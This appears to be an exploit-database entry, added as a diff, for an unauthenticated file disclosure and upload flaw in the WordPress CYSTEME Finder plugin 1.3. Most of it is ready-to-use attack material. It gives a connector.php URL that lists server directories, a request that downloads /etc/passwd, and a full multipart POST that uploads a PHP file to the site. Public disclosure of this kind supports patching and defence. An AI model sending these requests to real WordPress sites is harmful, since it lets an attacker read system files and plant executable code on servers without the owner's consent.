@@ -1,0 +1,119 @@
+Exploit Title: WordPress CYSTEME Finder Plugin 1.3 - Arbitrary File Dislcosure/Arbitrary File Upload
+Link: https://wordpress.org/plugins/cysteme-finder/
+Version: 1.3
+Date: August 23rd 2016
+Exploit Author: T0w3ntum
+Author Website: t0w3ntum.com
+
+### SUMMARY
+
+CYSTEME Finder is an admin file manager plugin for wordpress that fails to check cookie data in the request 
+to http://server/wp-content/plugins/cysteme-finder/php/connector.php 
+
+This allows attackers to upload, download, and browse the remote file system. 
+
+### LFI
+
+- Retrieve all data in the root wordpress directory. This will return JSON. 
+Exploit: 
+http://server/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/var/www/wordpress&cmd=open&init=1&tree=1
+
+Reply:
+{
+  "cwd": {
+    "mime": "directory",
+    "ts": 1471999484,
+    "read": 1,
+    "write": 1,
+    "size": 0,
+    "hash": "l1_Lw",
+    "volumeid": "l1_",
+    "name": "Fichiers du site",
+    "date": "Today 20:44",
+    "locked": 1,
+    "dirs": 1
+  },
+  "options": {
+    "path": "Fichiers du site",
+    "url": null,
+    "tmbUrl": "",
+    "disabled": [
+      
+    ],
+    "separator": "\/",
+    "copyOverwrite": 1,
+    "archivers": {
+      "create": [
+        "application\/x-tar",
+        "application\/x-gzip",
+        "application\/x-bzip2"
+      ],
+      "extract": [
+        "application\/x-tar",
+        "application\/x-gzip",
+        "application\/x-bzip2",
+        "application\/zip"
+      ]
+    }
+  },
+  "files": [
+    {
+      "mime": "directory",
+      "ts": 1471999484,
+      "read": 1,
+      "write": 1,
+      "size": 0,
+      "hash": "l1_Lw",
+      "volumeid": "l1_",
+      "name": "Fichiers du site",
+      "date": "Today 20:44",
+      "locked": 1,
+      "dirs": 1
+    },
+    {
+      "mime": "text\/plain",
+      "ts": 1471714510,
+      "read": 1,
+      "write": 1,
+      "size": 813,
+      "hash": "l1_Lmh0YWNjZXNz",
+      "name": ".htaccess",
+      "phash": "l1_Lw",
+      "date": "20 Aug 2016 13:35"
+    },
+
+Simply replacing wphome with any other directory path will return file information for that directory. 
+If you want to download that file, get the hash value for the file and include it in the following request:
+ 
+Will download /etc/passwd
+http://server/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/etc&cmd=file&target=l1_cGFzc3dk&download=1
+
+### File Upload
+
+As with downloading the files, you will need the hash value for the target directory. With the hash value, send a payload similar to the following. 
+
+POST /wordpress/wp-content/plugins/cysteme-finder/php/connector.php?wphome=/var/www/wordpress/&wpurl=http://server HTTP/1.1
+Host: http://server
+Content-Length: 314
+Origin: http://server
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36
+Content-Type: multipart/form-data; boundary=--------723608748
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.8
+Connection: close
+
+----------723608748
+Content-Disposition: form-data; name="cmd"
+
+upload
+----------723608748
+Content-Disposition: form-data; name="target"
+
+l1_Lw
+----------723608748
+Content-Disposition: form-data; name="upload[]"; filename="test.php"
+Content-Type: text/html
+
+<?php phpinfo(); ?>
+----------723608748--
